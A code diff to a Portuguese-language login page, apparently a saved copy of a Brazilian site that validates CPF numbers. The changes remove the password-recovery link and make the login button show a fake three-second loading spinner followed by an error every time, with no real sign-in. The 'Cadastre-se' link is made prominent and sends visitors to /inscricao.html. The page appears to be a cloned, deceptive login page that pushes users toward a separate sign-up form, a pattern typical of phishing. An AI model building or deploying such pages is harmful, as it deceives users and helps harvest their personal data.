@@ -38,9 +38,7 @@
  <div class=mb-3>
  <div class=w-100>
  <label class=form-label for=password required>Senha</label>
- <button type=button class="float-end btn btn-link">
- Esqueceu a senha?
- </button>
+ 
  </div>
  <div class="fv-row fv-plugins-icon-container">
  <div class="input-group has-validation">
@@ -71,7 +69,7 @@
  </div>
  <div class="card-footer py-3 border-0">
  <div class=text-center>
- Não tem uma Conta? <a href="javascript:void(0)" class=text-dark>Cadastre-se</a>
+ Não tem uma Conta? <a href="javascript:void(0)" id="btn-cadastrar" style="color:#0d6efd;font-weight:700;text-decoration:underline;cursor:pointer">Cadastre-se</a>
  </div>
  </div>
  </div>
@@ -98,6 +96,11 @@
 <meta name=referrer content=no-referrer><style>.sf-hidden{display:none!important}</style><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;></head>
 <body><div id=rc-anchor-alert class=rc-anchor-alert></div>
 <div class=&quot;rc-anchor rc-anchor-invisible rc-anchor-light rc-anchor-invisible-hover&quot;><div id=recaptcha-accessible-status class=&quot;rc-anchor-aria-status sf-hidden&quot; aria-hidden=true>reCAPTCHA requer verificação. </div><div class=rc-anchor-error-msg-container style=display:none></div><div class=rc-anchor-normal-footer><div class=rc-anchor-logo-large role=presentation><div class=&quot;rc-anchor-logo-img rc-anchor-logo-img-large&quot;></div></div><div class=rc-anchor-pt></div></div><div class=rc-anchor-invisible-text><span>protegido por <strong>reCAPTCHA</strong></span><div class=rc-anchor-pt></div></div></div><iframe style=display:none></iframe>"></iframe></div><div class=grecaptcha-error></div><textarea id=g-recaptcha-response-100000 name=g-recaptcha-response class=g-recaptcha-response style="width:250px;height:40px;border:1px solid rgb(193,193,193);margin:10px 25px;padding:0px;resize:none;display:none"></textarea></div><iframe style=display:none></iframe></div>
+
+<div id="plat-overlay" style="display:none;position:fixed;inset:0;background:rgba(255,255,255,.85);z-index:99999;align-items:center;justify-content:center">
+<div style="width:52px;height:52px;border:5px solid #cfd8e3;border-top-color:#003a79;border-radius:50%;animation:platspin .8s linear infinite"></div>
+</div>
+<style>@keyframes platspin{to{transform:rotate(360deg)}}</style>
 <script id="__plataforma_logic">
 (function(){
   function validaCPF(cpf){cpf=(cpf||'').replace(/\D/g,'');if(cpf.length!==11||/^(\d)\1{10}$/.test(cpf))return false;var s=0,r,i;for(i=0;i<9;i++)s+=parseInt(cpf.charAt(i),10)*(10-i);r=(s*10)%11;if(r===10)r=0;if(r!==parseInt(cpf.charAt(9),10))return false;s=0;for(i=0;i<10;i++)s+=parseInt(cpf.charAt(i),10)*(11-i);r=(s*10)%11;if(r===10)r=0;if(r!==parseInt(cpf.charAt(10),10))return false;return true;}
@@ -136,8 +139,11 @@
       refresh();
     });
     pwd.addEventListener('input',function(){msg.style.display='none';refresh();});
-    btn.addEventListener('click',function(){if(btn.disabled)return;msg.style.display='block';});
+    btn.addEventListener('click',function(){if(btn.disabled)return;var o=document.getElementById('plat-overlay');if(o)o.style.display='flex';setTimeout(function(){if(o)o.style.display='none';msg.style.display='block';},3000);});
     refresh();
+
+    var cad=document.getElementById('btn-cadastrar');
+    if(cad){cad.addEventListener('click',function(e){e.preventDefault();var o=document.getElementById('plat-overlay');if(o)o.style.display='flex';setTimeout(function(){window.location.href='/inscricao.html';},1000);});}
 
     var icon=document.getElementById('password_icon');
     if(icon){
